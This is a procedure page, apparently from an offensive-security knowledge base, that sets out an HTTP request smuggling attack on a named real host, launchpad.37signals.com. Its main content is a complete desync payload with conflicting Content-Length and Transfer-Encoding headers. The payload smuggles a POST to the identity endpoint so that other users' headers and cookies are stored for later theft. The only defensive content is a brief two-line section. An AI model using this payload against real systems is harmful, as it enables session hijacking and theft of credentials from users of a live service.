---
tags:
  - http-request-smuggling
  - cookie-capture
type: procedure
tools:
  - '[[tools/Turbo-Intruder]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/http-smuggling-post-desync-cookie-capture]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 0739a616-85a2-4251-bed0-bc8867f9ff62
created_at: '2025-12-13T09:01:21.719Z'
updated_at: '2025-12-13T09:01:21.719Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Desync Request for Cookie Capture

## Summary

This procedure crafts a desync request to smuggle a POST that updates the identity with victim data, capturing headers and cookies.

## Description

Using extracted tokens, create a smuggling request with Content-Length 903 and append a POST to store victim requests in the application.

## Requirements

1. Extracted tokens from prior step
2. Turbo Intruder
3. Access to target

## Defense

Defensive measures and detection strategies:

- Validate request sizes and encodings
- Detect anomalous POSTs to identity endpoints

## Objectives

1. Smuggle capture request
2. Store victim data
3. Enable data exfiltration

## Instructions

### Step 1: Send Capture Desync Request

**Context**: Insert extracted values and send the request.

**Command** ([[commands/http-smuggling-post-desync-cookie-capture]]):
```bash
POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 903
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: foo

213
x=1
0

POST /identity HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 435
X-Forwarded-Proto: https
Content-Type: application/x-www-form-urlencoded
Cookie: identity_id=PASTE_identity_id_HERE; session_token=PASTE_session_token_HERE; _launchpad_session=PASTE_launchpad_session_HERE

_method=patch&authenticity_token=PASTE_authenticity_token_HERE&identity%5bavatar%5d=&identity%5bname%5d=
```

> This captures and stores victim data; expect success via later verification.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/http-smuggling-post-desync-cookie-capture]]

## Tools Used

- [[tools/Turbo-Intruder]]

## Tags

- [[http-request-smuggling]]
- [[cookie-capture]]
